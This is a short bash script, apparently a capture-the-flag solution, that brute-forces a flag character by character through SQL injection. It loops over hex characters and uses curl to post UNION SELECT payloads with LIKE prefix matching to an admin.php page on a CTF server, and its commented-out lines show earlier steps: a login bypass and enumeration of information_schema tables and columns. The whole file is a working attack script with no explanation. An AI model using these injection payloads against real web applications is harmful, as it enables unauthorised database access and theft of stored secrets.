#!/bin/bash

#for a in a b c d e f g h i j k l m n o p q r s t u v w x y z;do
#for a in A B C D E F G H I J K L M N O P Q R S T U V W X Y Z;do
#for a in 1 2 3 4 5 6 7 8 9 0;do
#for a in a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 1 2 3 4 5 6 7 8 9 0;do
for a in a b c d e f 1 2 3 4 5 6 7 8 9 0;do
#aa=`printf "user=flag&password=' OR password like '%c%%' #" $a`
aa=`printf "user=' UNION SELECT tag,value FROM top_secret WHERE tag='fl4g' AND value like '%c%%'; #" $a`
#aa=`printf "user=' UNION SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema!='mysql' AND table_schema!='information_schema' AND table_name like '%c%%'; #" $a`
#aa=`printf "user=' UNION SELECT table_name,column_name FROM information_schema.columns WHERE table_name='top_secret' AND column_name like '%c%%'; #" $a`
echo $a
curl -d "$aa" 'http://ctf.tw:6003/admin.php' 
done


